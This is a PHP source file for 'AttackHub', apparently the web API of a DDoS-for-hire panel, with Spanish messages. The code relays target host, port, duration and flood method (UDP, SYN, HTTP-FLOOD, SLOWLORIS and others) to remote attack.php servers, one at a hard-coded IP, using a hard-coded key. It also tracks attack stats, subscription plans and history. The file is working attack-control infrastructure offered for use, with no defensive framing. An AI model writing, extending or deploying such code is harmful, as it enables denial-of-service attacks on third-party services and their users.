<?php
/**
 * ═══════════════════════════════════════════════════════════════════════
 * AttackHub Web API — 1:1 replica of AttackApi.cs
 * ═══════════════════════════════════════════════════════════════════════
 *
 * Every function here maps directly to AttackApi.cs:
 *
 *   C# AttackApi                     PHP api.php
 *   ─────────────────────────────    ─────────────────────────────
 *   HttpGetWithRetryAsync()          httpGet()
 *   GetMethodsFromApiAsync()         getMethodsFromApi()
 *   ExtractMethodsFromJson()         extractMethodsFromJson()
 *   ParseMethodsFromText()           parseMethodsFromText()
 *   IsLikelyMethodName()             isLikelyMethod()
 *   GetAvailableMethodsAsync()       getAvailableMethods()
 *   GetStatsFromApiAsync()           getStatsFromApi()
 *   CheckApiAsync()                  checkApi()
 *   GetPerApiStatusAsync()           → action=status
 *   CheckSingleApiAsync()            → action=status_single
 *   SendAttackAsync()                → action=send
 *   StopAttackAsync()                → action=stop
 *   GetCombinedStatsAsync()          → action=stats
 *   GetHealthSummary()               → action=health
 *   FixPermissionsAsync()            → action=fix_permissions
 *   FixAllPermissionsAsync()         → action=fix_all_permissions
 *
 * Actions:
 *   methods, config, config_save, send, stop, stats, status,
 *   status_single, health, fix_permissions, fix_all_permissions,
 *   history_load, history_save, stats_counters, reload_apis, reset_apis
 */

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(204); exit; }

// ═══════════════════════════════════════════════════════════════════════
// CONFIGURATION — matches AttackApi.cs constants
// ═══════════════════════════════════════════════════════════════════════
define('SECRET_KEY',              'mdp');
define('REQUEST_TIMEOUT',         120);     // RequestTimeoutSeconds
define('MAX_RETRIES',             2);       // MaxRetries
define('HEALTH_FAIL_THRESHOLD',   1);       // HealthFailThreshold
define('HEALTH_COOLDOWN_SECONDS', 5);       // HealthCooldownSeconds
define('METHODS_CACHE_SECONDS',   120);     // CacheDuration = 2 min
define('MIN_ATTACK_INTERVAL_MS',  500);     // MinAttackInterval
define('DATA_DIR', __DIR__ . '/data');
define('CONFIG_FILE',      DATA_DIR . '/config.json');
define('CACHE_FILE',       DATA_DIR . '/methods_cache.json');
define('RATE_LIMIT_FILE',  DATA_DIR . '/last_attack.txt');

// ── _builtinApis (matches AttackApi._builtinApis) ─────────────────────
$BUILTIN_APIS = [
    ['url' => 'http://163.5.102.40/attack.php', 'enabled' => true,  'label' => 'API #1 (Principal)'],
    ['url' => 'http://0.0.0.0/attack.php',      'enabled' => false, 'label' => 'API #2'],
    ['url' => 'http://0.0.0.0/attack.php',      'enabled' => false, 'label' => 'API #3'],
    ['url' => 'http://0.0.0.0/attack.php',      'enabled' => false, 'label' => 'API #4'],
    ['url' => 'http://0.0.0.0/attack.php',      'enabled' => false, 'label' => 'API #5'],
];

if (!is_dir(DATA_DIR)) mkdir(DATA_DIR, 0755, true);

// ═══════════════════════════════════════════════════════════════════════
// HEALTH TRACKING — matches ApiHealth class
// ═══════════════════════════════════════════════════════════════════════
function healthFile(string $url): string {
    return DATA_DIR . '/health_' . md5($url) . '.json';
}

function getHealth(string $url): array {
    $f = healthFile($url);
    if (file_exists($f)) {
        $d = json_decode(file_get_contents($f), true);
        if ($d) return $d;
    }
    return ['failures' => 0, 'cooldown_until' => 0, 'avg_latency' => 0, 'last_latency' => 0, 'samples' => 0];
}

function saveHealth(string $url, array $h): void {
    file_put_contents(healthFile($url), json_encode($h));
}

// matches ApiHealth.RecordSuccess()
function recordSuccess(string $url, int $latencyMs): void {
    $h = getHealth($url);
    $h['failures'] = 0;
    $h['cooldown_until'] = 0;
    $h['last_latency'] = $latencyMs;
    $n = ++$h['samples'];
    $h['avg_latency'] = $n === 1 ? $latencyMs : (int)(($h['avg_latency'] * ($n - 1) + $latencyMs) / $n);
    saveHealth($url, $h);
}

// matches ApiHealth.RecordFailure()
function recordFailure(string $url): void {
    $h = getHealth($url);
    $h['failures']++;
    if ($h['failures'] >= HEALTH_FAIL_THRESHOLD) {
        $h['cooldown_until'] = time() + HEALTH_COOLDOWN_SECONDS;
    }
    saveHealth($url, $h);
}

// matches ApiHealth.IsInCooldown
function isInCooldown(string $url): bool {
    return time() < (getHealth($url)['cooldown_until'] ?? 0);
}

// ═══════════════════════════════════════════════════════════════════════
// API LIST — matches _apis, GetHealthyApis(), ReloadApis(), ResetToBuiltin()
// ═══════════════════════════════════════════════════════════════════════

// matches _apis (enabled only)
function getEnabledApis(): array {
    global $BUILTIN_APIS;
    $custom = DATA_DIR . '/custom_apis.json';
    if (file_exists($custom)) {
        $c = json_decode(file_get_contents($custom), true);
        if (is_array($c) && !empty($c)) return array_values(array_filter($c, fn($a) => $a['enabled'] ?? true));
    }
    return array_values(array_filter($BUILTIN_APIS, fn($a) => $a['enabled']));
}

// matches ApiList (all, including disabled)
function getAllApis(): array {
    global $BUILTIN_APIS;
    $custom = DATA_DIR . '/custom_apis.json';
    if (file_exists($custom)) {
        $c = json_decode(file_get_contents($custom), true);
        if (is_array($c) && !empty($c)) return $c;
    }
    return $BUILTIN_APIS;
}

// matches GetHealthyApis() — sorted by avg latency, skip cooldown, fallback to all
function getHealthyApis(): array {
    $enabled = getEnabledApis();
    $healthy = array_filter($enabled, fn($a) => !isInCooldown($a['url']));
    usort($healthy, fn($a, $b) => getHealth($a['url'])['avg_latency'] <=> getHealth($b['url'])['avg_latency']);
    return !empty($healthy) ? array_values($healthy) : $enabled;
}

// ═══════════════════════════════════════════════════════════════════════
// HTTP HELPER — matches HttpGetWithRetryAsync()
// ═══════════════════════════════════════════════════════════════════════
function httpGet(string $url, int $timeout = REQUEST_TIMEOUT, int $maxRetries = MAX_RETRIES): ?string {
    for ($attempt = 0; $attempt <= $maxRetries; $attempt++) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL            => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => $timeout,
            CURLOPT_CONNECTTIMEOUT => 8,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_USERAGENT      => 'MultiTool/2.0',
            CURLOPT_SSL_VERIFYPEER => false,
        ]);
        $body     = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error    = curl_error($ch);
        curl_close($ch);

        if ($body !== false && $httpCode >= 200 && $httpCode < 300) return $body;

        // 429 Too Many Requests → wait and retry (matches C#)
        if ($httpCode === 429 && $attempt < $maxRetries) {
            usleep((int)(pow(2, $attempt) * 500000));
            continue;
        }
        // 5xx → retry with backoff (matches C#)
        if ($httpCode >= 500 && $attempt < $maxRetries) {
            usleep((int)(pow(2, $attempt) * 300000));
            continue;
        }
        if ($error && $attempt < $maxRetries) {
            usleep((int)(pow(2, $attempt) * 200000));
            continue;
        }
        break;
    }
    return null;
}

// ═══════════════════════════════════════════════════════════════════════
// METHODS FROM API — matches GetMethodsFromApiAsync() exactly
// ═══════════════════════════════════════════════════════════════════════
function getMethodsFromApi(string $apiUrl): array {
    $list = [];
    $start = microtime(true);

    // Try primary endpoint
    $body = httpGet("{$apiUrl}?action=methods", 10, 1);

    // Fallback endpoints if primary fails (matches C#)
    if (!$body) $body = httpGet("{$apiUrl}?methods", 8, 0);
    if (!$body) $body = httpGet("{$apiUrl}?action=methods&key=" . urlencode(SECRET_KEY), 8, 0);

    $elapsed = (int)((microtime(true) - $start) * 1000);

    if (!$body) { recordFailure($apiUrl); return []; }
    $body = trim($body);

    // Try JSON parsing
    if ($body[0] === '{' || $body[0] === '[') {
        $json = json_decode($body, true);
        if ($json !== null) $list = extractMethodsFromJson($json);
    }

    // Fallback: plain text
    if (empty($list) && $body[0] !== '{' && $body[0] !== '[') {
        $list = parseMethodsFromText($body);
    }

    // Fallback: strip HTML
    if (empty($list) && strpos($body, '<') !== false) {
        $stripped = strip_tags($body);
        $list = parseMethodsFromText($stripped);
    }

    // Deduplicate (case-insensitive like C#)
    $list = array_values(array_unique(array_map('strtoupper', $list)));

    if (!empty($list)) recordSuccess($apiUrl, $elapsed);
    else recordFailure($apiUrl);

    return $list;
}

// ═══════════════════════════════════════════════════════════════════════
// JSON EXTRACTION — matches ExtractMethodsFromJson() recursion exactly
// ═══════════════════════════════════════════════════════════════════════
function extractMethodsFromJson($data): array {
    $methods = [];

    // Array (sequential)
    if (is_array($data) && !isAssoc($data)) {
        foreach ($data as $item) {
            if (is_string($item) && isLikelyMethod(trim($item))) {
                $methods[] = trim($item);
            } elseif (is_array($item) && isAssoc($item)) {
                // [{"name":"UDP"},{"method":"TCP"}] pattern
                foreach (['name','method','id','value','label'] as $key) {
                    if (isset($item[$key]) && is_string($item[$key]) && trim($item[$key]) !== '') {
                        $methods[] = trim($item[$key]);
                        break;
                    }
                }
            } elseif (is_numeric($item)) {
                $methods[] = (string)$item;
            }
        }
        return $methods;
    }

    // Object (associative)
    if (is_array($data) && isAssoc($data)) {
        // Check known keys: matches C# methodKeys exactly
        foreach (['methods','data','available','list','attacks','result','attack_methods'] as $key) {
            if (!isset($data[$key])) continue;
            if (is_array($data[$key])) {
                $sub = extractMethodsFromJson($data[$key]);
                if (!empty($sub)) return $sub;
            } elseif (is_string($data[$key]) && trim($data[$key]) !== '') {
                // "methods": "UDP,TCP,SYN"
                $sub = parseMethodsFromText($data[$key]);
                if (!empty($sub)) return $sub;
            }
        }

        // {"UDP":true, "TCP":true} pattern — matches C# exactly
        $skipKeys = ['SUCCESS','MESSAGE','ERROR','STATUS','CODE','KEY','HOST','PORT','TIME','ACTION'];
        foreach ($data as $k => $v) {
            $upper = strtoupper(trim($k));
            if (in_array($upper, $skipKeys)) continue;
            if ($v === true || $v === 1 || $v === '1' || $v === 'true' || $v === 'enabled' || $v === 'on') {
                if (isLikelyMethod($k)) $methods[] = trim($k);
            }
        }
    }

    // String
    if (is_string($data) && trim($data) !== '') {
        return parseMethodsFromText($data);
    }

    return $methods;
}

// matches ParseMethodsFromText() — comma, newline, pipe, semicolon separated
function parseMethodsFromText(string $text): array {
    $methods = [];
    $tokens = preg_split('/[,\n\r|;]+/', $text);
    foreach ($tokens as $token) {
        $clean = trim($token, " \t\"'[]{}");
        if (strlen($clean) >= 2 && strlen($clean) <= 30 && isLikelyMethod($clean)) {
            $methods[] = $clean;
        }
    }
    return $methods;
}

// matches IsLikelyMethodName() exactly
function isLikelyMethod(string $name): bool {
    $name = trim($name);
    if (strlen($name) < 2 || strlen($name) > 30) return false;
    if (!preg_match('/^[a-zA-Z0-9\-_.]+$/', $name)) return false;
    if (ctype_digit($name)) return false;
    return true;
}

function isAssoc(array $arr): bool {
    if (empty($arr)) return false;
    return array_keys($arr) !== range(0, count($arr) - 1);
}

// ═══════════════════════════════════════════════════════════════════════
// METHODS CACHE — matches _cachedMethods + CacheDuration
// ═══════════════════════════════════════════════════════════════════════
function getCachedMethods(): ?array {
    if (!file_exists(CACHE_FILE)) return null;
    $data = json_decode(file_get_contents(CACHE_FILE), true);
    if (!$data || !isset($data['methods']) || !isset($data['expires'])) return null;
    if (time() > $data['expires']) return null;
    return $data['methods'];
}

function setCachedMethods(array $methods): void {
    file_put_contents(CACHE_FILE, json_encode([
        'methods' => $methods,
        'expires' => time() + METHODS_CACHE_SECONDS,
    ]));
}

function clearMethodsCache(): void {
    if (file_exists(CACHE_FILE)) unlink(CACHE_FILE);
}

// ═══════════════════════════════════════════════════════════════════════
// GetAvailableMethodsAsync() — exact replica
// ═══════════════════════════════════════════════════════════════════════
function getAvailableMethods(bool $forceRefresh = false): array {
    if (!$forceRefresh) {
        $cached = getCachedMethods();
        if ($cached !== null) return $cached;
    }

    $allMethods = [];
    $healthy = getHealthyApis();

    foreach ($healthy as $api) {
        $m = getMethodsFromApi($api['url']);
        foreach ($m as $method) {
            $allMethods[strtoupper($method)] = true; // HashSet behavior
        }
    }

    if (!empty($allMethods)) {
        $result = array_keys($allMethods);
        sort($result);
        setCachedMethods($result);
        return $result;
    }

    // Return cached even if expired (matches: return _cachedMethods ?? [])
    $old = null;
    if (file_exists(CACHE_FILE)) {
        $d = json_decode(file_get_contents(CACHE_FILE), true);
        if ($d && isset($d['methods'])) $old = $d['methods'];
    }
    return $old ?? [];
}

// ═══════════════════════════════════════════════════════════════════════
// GetStatsFromApiAsync() — exact replica
// ═══════════════════════════════════════════════════════════════════════
function getStatsFromApi(string $apiUrl): array {
    $body = httpGet("{$apiUrl}?action=stats&key=" . urlencode(SECRET_KEY), 5, 0);
    if (!$body) return ['url' => $apiUrl, 'tx_mbps' => 0, 'rx_mbps' => 0, 'running' => 0, 'interface' => '?'];
    $json = json_decode($body, true);
    if (!$json) return ['url' => $apiUrl, 'tx_mbps' => 0, 'rx_mbps' => 0, 'running' => 0, 'interface' => '?'];
    return [
        'url'       => $apiUrl,
        'tx_mbps'   => (float)($json['tx_mbps'] ?? 0),
        'rx_mbps'   => (float)($json['rx_mbps'] ?? 0),
        'running'   => (int)($json['running'] ?? 0),
        'interface' => $json['interface'] ?? '?',
    ];
}

// ═══════════════════════════════════════════════════════════════════════
// CheckApiAsync() — exact replica (returns ApiStatusEntry)
// ═══════════════════════════════════════════════════════════════════════
function checkApi(array $api): array {
    $url   = $api['url'];
    $label = $api['label'] ?? $url;
    $idx   = $api['_index'] ?? 0;

    if (!($api['enabled'] ?? true)) {
        return [
            'index' => $idx, 'label' => $label, 'url' => $url,
            'enabled' => false, 'online' => false, 'methods' => 0,
            'method_list' => [], 'status' => 'Desactivada',
            'latency' => 0, 'tx_mbps' => 0, 'rx_mbps' => 0, 'running' => 0,
        ];
    }

    $start = microtime(true);
    $methods = getMethodsFromApi($url);
    $latency = (int)((microtime(true) - $start) * 1000);
    $isOnline = !empty($methods);

    if (!$isOnline) {
        return [
            'index' => $idx, 'label' => $label, 'url' => $url,
            'enabled' => true, 'online' => false, 'methods' => 0,
            'method_list' => [], 'status' => empty($methods) ? 'Offline' : 'Sin métodos',
            'latency' => $latency, 'tx_mbps' => 0, 'rx_mbps' => 0, 'running' => 0,
        ];
    }

    // Get stats (like C# GetStatsFromApiAsync)
    $stats = getStatsFromApi($url);

    return [
        'index'       => $idx,
        'label'       => $label,
        'url'         => $url,
        'enabled'     => true,
        'online'      => true,
        'methods'     => count($methods),
        'method_list' => $methods,
        'status'      => 'Online',
        'latency'     => $latency,
        'tx_mbps'     => round($stats['tx_mbps'], 2),
        'rx_mbps'     => round($stats['rx_mbps'], 2),
        'running'     => $stats['running'],
    ];
}

// ═══════════════════════════════════════════════════════════════════════
// SendToApiAsync() — exact replica
// ═══════════════════════════════════════════════════════════════════════
function sendToApi(string $apiUrl, string $host, string $port, string $time, string $method): array {
    $start = microtime(true);
    $url = "{$apiUrl}?" . http_build_query([
        'key' => SECRET_KEY, 'host' => $host, 'port' => $port,
        'time' => $time, 'method' => $method,
    ]);
    $body = httpGet($url, REQUEST_TIMEOUT, MAX_RETRIES);
    $elapsed = (int)((microtime(true) - $start) * 1000);
    $health = getHealth($apiUrl);

    if (!$body) { recordFailure($apiUrl); return ['success' => false, 'message' => 'Sin respuesta']; }

    $json = json_decode($body, true);
    if (!$json) { recordFailure($apiUrl); return ['success' => false, 'message' => $body]; }

    $success = $json['success'] ?? false;
    $message = $json['message'] ?? $body;

    if (!$success) {
        // Check for available methods in error response (matches C#)
        if (isset($json['available']) && is_array($json['available'])) {
            $avail = array_filter($json['available'], fn($v) => is_string($v) && $v !== '');
            if (!empty($avail)) $message .= "\nDisponibles: " . implode(', ', $avail);
        }
        recordFailure($apiUrl);
        return ['success' => false, 'message' => $message];
    }

    recordSuccess($apiUrl, $elapsed);
    return ['success' => true, 'message' => $message];
}

// ═══════════════════════════════════════════════════════════════════════
// StopOnApiAsync() — exact replica
// ═══════════════════════════════════════════════════════════════════════
function stopOnApi(string $apiUrl, string $host, ?string $method): array {
    $params = ['action' => 'stop', 'key' => SECRET_KEY, 'host' => $host];
    if ($method) $params['method'] = $method;
    $url = "{$apiUrl}?" . http_build_query($params);

    $body = httpGet($url, 15, 1);
    if (!$body) return ['success' => false, 'message' => 'Sin respuesta'];

    $json = json_decode($body, true);
    if (!$json) return ['success' => false, 'message' => $body];

    return [
        'success' => $json['success'] ?? false,
        'message' => $json['message'] ?? $body,
    ];
}

// ═══════════════════════════════════════════════════════════════════════
// FixPermissionsAsync() — exact replica
// ═══════════════════════════════════════════════════════════════════════
function fixPermissions(string $apiUrl): array {
    $endpoints = [
        "{$apiUrl}?action=chmod&key=" . urlencode(SECRET_KEY),
        "{$apiUrl}?action=fix&key=" . urlencode(SECRET_KEY),
        "{$apiUrl}?action=permissions&key=" . urlencode(SECRET_KEY),
        "{$apiUrl}?action=setup&key=" . urlencode(SECRET_KEY),
    ];

    foreach ($endpoints as $url) {
        $body = httpGet($url, 10, 0);
        if (!$body) continue;

        $json = json_decode($body, true);
        if ($json) {
            if ($json['success'] ?? false) {
                $msg = $json['message'] ?? 'Permisos corregidos';
                return ['success' => true, 'message' => $msg];
            }
        } else {
            // Plain text check (matches C#)
            if (stripos($body, 'ok') !== false || stripos($body, 'success') !== false || stripos($body, 'chmod') !== false) {
                return ['success' => true, 'message' => 'Permisos corregidos'];
            }
        }
    }

    return ['success' => false, 'message' => "El servidor no soporta corrección remota de permisos.\n\nSolución manual por SSH:\n  chmod -R 755 /var/www/html/\n  chmod 644 /var/www/html/attack.php\n  chown -R www-data:www-data /var/www/html/"];
}

// ═══════════════════════════════════════════════════════════════════════
// Rate limiter — matches MinAttackInterval
// ═══════════════════════════════════════════════════════════════════════
function checkRateLimit(): ?string {
    if (file_exists(RATE_LIMIT_FILE)) {
        $last = (float)file_get_contents(RATE_LIMIT_FILE);
        $elapsed = (microtime(true) - $last) * 1000;
        if ($elapsed < MIN_ATTACK_INTERVAL_MS) {
            return 'Espera ' . (int)(MIN_ATTACK_INTERVAL_MS - $elapsed) . 'ms entre ataques.';
        }
    }
    file_put_contents(RATE_LIMIT_FILE, microtime(true));
    return null;
}

// ═══════════════════════════════════════════════════════════════════════
// Config — plan + methods base
// ═══════════════════════════════════════════════════════════════════════
function loadConfig(): array {
    $defaults = [
        'plan'       => ['name' => 'Free', 'maxTime' => 60, 'maxConcurrent' => 1],
        'methods_l4' => ['UDP','TCP','SYN','ACK','HTTP-FLOOD','SLOWLORIS'],
        'methods_l7' => ['GET','POST','HEAD','HTTP-FLOOD','SLOWLORIS','OPTIONS'],
    ];
    if (file_exists(CONFIG_FILE)) {
        $data = json_decode(file_get_contents(CONFIG_FILE), true);
        if (is_array($data)) return array_merge($defaults, $data);
    }
    file_put_contents(CONFIG_FILE, json_encode($defaults, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
    return $defaults;
}

function saveConfig(array $cfg): void {
    file_put_contents(CONFIG_FILE, json_encode($cfg, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
}

// ═══════════════════════════════════════════════════════════════════════
// ROUTE — action dispatch
// ═══════════════════════════════════════════════════════════════════════
$action = $_GET['action'] ?? $_POST['action'] ?? '';

switch ($action) {

    // ── GetAvailableMethodsAsync() + config merge ─────────────────────
    case 'methods':
        $cfg      = loadConfig();
        $configL4 = array_values(array_unique(array_map('strtoupper', $cfg['methods_l4'] ?? [])));
        $configL7 = array_values(array_unique(array_map('strtoupper', $cfg['methods_l7'] ?? [])));

        // Auto-detect from APIs (like C# GetAvailableMethodsAsync)
        $apiDetected = getAvailableMethods();
        $apiCount    = 0;
        foreach (getHealthyApis() as $a) {
            $h = getHealth($a['url']);
            if (($h['failures'] ?? 99) === 0) $apiCount++;
        }
        $apisChecked = !empty($apiDetected) || $apiCount > 0;

        // Build L4 list with in_api status
        $l4 = [];
        foreach ($configL4 as $m) {
            $l4[] = ['name' => $m, 'in_api' => in_array($m, $apiDetected), 'source' => 'config'];
        }

        // New methods from API not in config → auto-add
        $newMethods = [];
        $allConfig  = array_merge($configL4, $configL7);
        foreach ($apiDetected as $m) {
            if (!in_array($m, $allConfig)) {
                $l4[] = ['name' => $m, 'in_api' => true, 'source' => 'autodetect'];
                $newMethods[] = $m;
                $configL4[] = $m;
            }
        }

        // Build L7 list with in_api status
        $l7 = [];
        foreach ($configL7 as $m) {
            $l7[] = ['name' => $m, 'in_api' => in_array($m, $apiDetected), 'source' => 'config'];
        }

        usort($l4, fn($a, $b) => strcmp($a['name'], $b['name']));
        usort($l7, fn($a, $b) => strcmp($a['name'], $b['name']));

        // Auto-save new methods back to config
        if (!empty($newMethods)) {
            sort($configL4);
            $cfg['methods_l4'] = $configL4;
            saveConfig($cfg);
        }

        $availL4   = array_values(array_map(fn($m) => $m['name'], array_filter($l4, fn($m) => $m['in_api'])));
        $availL7   = array_values(array_map(fn($m) => $m['name'], array_filter($l7, fn($m) => $m['in_api'])));
        $unavailL4 = array_values(array_map(fn($m) => $m['name'], array_filter($l4, fn($m) => !$m['in_api'])));
        $unavailL7 = array_values(array_map(fn($m) => $m['name'], array_filter($l7, fn($m) => !$m['in_api'])));

        echo json_encode([
            'success'      => true,
            'methods_l4'   => $l4,
            'methods_l7'   => $l7,
            'available_l4' => $availL4,
            'available_l7' => $availL7,
            'unavail_l4'   => $unavailL4,
            'unavail_l7'   => $unavailL7,
            'api_detected' => $apiDetected,
            'new_methods'  => $newMethods,
            'apis_online'  => $apiCount,
            'apis_checked' => $apisChecked,
            'count'        => count($availL4) + count($availL7),
        ]);
        break;

    // ── Config ────────────────────────────────────────────────────────
    case 'config':
        echo json_encode(array_merge(['success' => true], loadConfig()));
        break;

    case 'config_save':
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            echo json_encode(['success' => false, 'message' => 'POST requerido.']);
            break;
        }
        $body = json_decode(file_get_contents('php://input'), true);
        if (!$body) { echo json_encode(['success' => false, 'message' => 'JSON invalido.']); break; }
        $current = loadConfig();
        foreach (['plan', 'methods_l4', 'methods_l7'] as $k) {
            if (isset($body[$k])) $current[$k] = $body[$k];
        }
        saveConfig($current);
        clearMethodsCache();
        echo json_encode(['success' => true]);
        break;

    // ── SendAttackAsync() — exact replica ─────────────────────────────
    case 'send':
        $host   = $_GET['host']   ?? $_POST['host']   ?? '';
        $port   = $_GET['port']   ?? $_POST['port']   ?? '';
        $time   = $_GET['time']   ?? $_POST['time']   ?? '';
        $method = $_GET['method'] ?? $_POST['method'] ?? '';

        if (!$host)   { echo json_encode(['success' => false, 'message' => 'Error: host vacío.']); break; }
        if (!$port)   { echo json_encode(['success' => false, 'message' => 'Error: port vacío.']); break; }
        if (!$time)   { echo json_encode(['success' => false, 'message' => 'Error: time vacío.']); break; }
        if (!$method) { echo json_encode(['success' => false, 'message' => 'Error: method vacío.']); break; }

        // Rate limiting (matches C# MinAttackInterval)
        $rateLimitMsg = checkRateLimit();
        if ($rateLimitMsg) { echo json_encode(['success' => false, 'message' => $rateLimitMsg]); break; }

        // Verify method exists (matches C# exactly)
        $methods = getAvailableMethods();
        if (empty($methods)) {
            echo json_encode(['success' => false, 'message' => "Error: No se pudo obtener métodos de ninguna API.\nVerifica que los servidores estén en línea."]);
            break;
        }
        $exists = in_array(strtoupper($method), array_map('strtoupper', $methods));
        if (!$exists) {
            // Force refresh and retry (matches C#)
            $methods = getAvailableMethods(true);
            $exists = in_array(strtoupper($method), array_map('strtoupper', $methods));
            if (!$exists) {
                echo json_encode(['success' => false, 'message' => "Error: El método \"{$method}\" no existe en ningún servidor.\n\nMétodos disponibles: " . implode(', ', $methods)]);
                break;
            }
        }

        // Send to healthy APIs first, fallback to all (matches C#)
        $targets = getHealthyApis();
        $ok = 0; $fail = 0; $details = [];

        foreach ($targets as $api) {
            $apiHost = parse_url($api['url'], PHP_URL_HOST) ?: $api['url'];
            $result = sendToApi($api['url'], $host, $port, $time, $method);
            if ($result['success']) {
                $ok++;
                $details[] = "✅ {$apiHost}";
            } else {
                $fail++;
                $details[] = "❌ {$apiHost}: {$result['message']}";
            }
        }

        $detail = implode("\n", $details);
        $total  = count($targets);
        if ($ok > 0) {
            echo json_encode([
                'success' => true,
                'message' => $total === 1 ? $detail : "Enviado a {$ok}/{$total} servidor(es)\n{$detail}",
                'ok' => $ok, 'fail' => $fail,
            ]);
        } else {
            echo json_encode([
                'success' => false,
                'message' => "Error: Falló en todos los servidores.\n{$detail}",
                'ok' => 0, 'fail' => $fail,
            ]);
        }
        break;

    // ── StopAttackAsync() — exact replica ─────────────────────────────
    case 'stop':
        $host   = $_GET['host']   ?? $_POST['host']   ?? '';
        $method = $_GET['method'] ?? $_POST['method'] ?? '';
        if (!$host) { echo json_encode(['success' => false, 'message' => 'Error: host vacío.']); break; }

        $apis = getEnabledApis();
        $ok = 0;
        foreach ($apis as $api) {
            $result = stopOnApi($api['url'], $host, $method ?: null);
            if ($result['success']) $ok++;
        }
        $total = count($apis);
        echo json_encode([
            'success' => $ok > 0,
            'message' => $ok > 0
                ? "Ataque detenido en {$ok}/{$total} servidor(es)."
                : "No se pudo detener en ningún servidor.",
        ]);
        break;

    // ── GetCombinedStatsAsync() — exact replica ───────────────────────
    case 'stats':
        $apis = getEnabledApis();
        $totalTx = 0; $totalRx = 0; $totalRunning = 0;
        foreach ($apis as $api) {
            $s = getStatsFromApi($api['url']);
            $totalTx      += $s['tx_mbps'];
            $totalRx      += $s['rx_mbps'];
            $totalRunning += $s['running'];
        }
        echo json_encode([
            'success' => true,
            'tx_mbps' => round($totalTx, 2),
            'rx_mbps' => round($totalRx, 2),
            'running' => $totalRunning,
        ]);
        break;

    // ── GetPerApiStatusAsync() — exact replica ────────────────────────
    case 'status':
        $allApis = getAllApis();
        $results = [];
        $onlineCount = 0; $offlineCount = 0; $disabledCount = 0;

        foreach ($allApis as $idx => $api) {
            $api['_index'] = $idx + 1;
            if (!isset($api['label'])) $api['label'] = 'API #' . ($idx + 1);
            $r = checkApi($api);
            $results[] = $r;
            if (!$r['enabled']) $disabledCount++;
            elseif ($r['online']) $onlineCount++;
            else $offlineCount++;
        }

        echo json_encode([
            'success' => true,
            'apis'    => $results,
            'summary' => [
                'total'    => count($allApis),
                'online'   => $onlineCount,
                'offline'  => $offlineCount,
                'disabled' => $disabledCount,
            ],
        ]);
        break;

    // ── CheckSingleApiAsync() — exact replica ─────────────────────────
    case 'status_single':
        $allApis = getAllApis();
        $idx = (int)($_GET['index'] ?? -1);
        if ($idx < 1 || $idx > count($allApis)) {
            echo json_encode(['success' => false, 'message' => 'Índice inválido.']);
            break;
        }
        $api = $allApis[$idx - 1];
        $api['_index'] = $idx;
        if (!isset($api['label'])) $api['label'] = 'API #' . $idx;
        echo json_encode(['success' => true, 'api' => checkApi($api)]);
        break;

    // ── GetHealthSummary() — exact replica ────────────────────────────
    case 'health':
        $enabled = getEnabledApis();
        $healthy = 0; $cooldown = 0;
        foreach ($enabled as $api) {
            if (isInCooldown($api['url'])) $cooldown++;
            else $healthy++;
        }
        echo json_encode([
            'success'  => true,
            'healthy'  => $healthy,
            'cooldown' => $cooldown,
            'total'    => count($enabled),
        ]);
        break;

    // ── FixPermissionsAsync() ─────────────────────────────────────────
    case 'fix_permissions':
        $apiUrl = $_GET['url'] ?? '';
        if (!$apiUrl) { echo json_encode(['success' => false, 'message' => 'URL requerida.']); break; }
        echo json_encode(fixPermissions($apiUrl));
        break;

    // ── FixAllPermissionsAsync() — exact replica ──────────────────────
    case 'fix_all_permissions':
        $enabled = getEnabledApis();
        $fixed = 0; $failed = 0; $details = [];
        foreach ($enabled as $api) {
            $host = parse_url($api['url'], PHP_URL_HOST) ?: $api['url'];
            $result = fixPermissions($api['url']);
            if ($result['success']) {
                $fixed++;
                $details[] = "✅ {$host}";
            } else {
                $failed++;
                $details[] = "❌ {$host}: {$result['message']}";
            }
        }
        echo json_encode([
            'success' => $fixed > 0,
            'fixed'   => $fixed,
            'failed'  => $failed,
            'details' => implode("\n", $details),
        ]);
        break;

    // ── History ───────────────────────────────────────────────────────
    case 'history_load':
        $type = $_GET['type'] ?? 'ip';
        $file = DATA_DIR . '/history_' . ($type === 'url' ? 'url' : 'ip') . '.json';
        echo file_exists($file) ? file_get_contents($file) : '[]';
        break;

    case 'history_save':
        $type = $_GET['type'] ?? $_POST['type'] ?? 'ip';
        $file = DATA_DIR . '/history_' . ($type === 'url' ? 'url' : 'ip') . '.json';
        $body = file_get_contents('php://input');
        if ($body) { file_put_contents($file, $body); echo json_encode(['success' => true]); }
        else { echo json_encode(['success' => false, 'message' => 'No data']); }
        break;

    // ── Attack counters ──────────────────────────────────────────────
    case 'stats_counters':
        $file = DATA_DIR . '/attack_stats.json';
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $body = json_decode(file_get_contents('php://input'), true);
            if ($body) {
                $current = file_exists($file) ? (json_decode(file_get_contents($file), true) ?: []) : [];
                foreach (['ipStarted','ipFinished','urlStarted','urlFinished'] as $k) {
                    if (isset($body[$k])) $current[$k] = (int)$body[$k];
                }
                file_put_contents($file, json_encode($current));
                echo json_encode(['success' => true]);
            }
        } else {
            echo file_exists($file) ? file_get_contents($file) : json_encode(['ipStarted'=>0,'ipFinished'=>0,'urlStarted'=>0,'urlFinished'=>0]);
        }
        break;

    // ── ReloadApis() / ResetToBuiltin() ──────────────────────────────
    case 'reload_apis':
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') { echo json_encode(['success' => false]); break; }
        $body = json_decode(file_get_contents('php://input'), true);
        if ($body && isset($body['apis']) && is_array($body['apis'])) {
            $apis = array_map(fn($u) => ['url' => trim($u), 'enabled' => true, 'label' => trim($u)], $body['apis']);
            file_put_contents(DATA_DIR . '/custom_apis.json', json_encode($apis, JSON_PRETTY_PRINT));
            clearMethodsCache();
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['success' => false, 'message' => 'Invalid data']);
        }
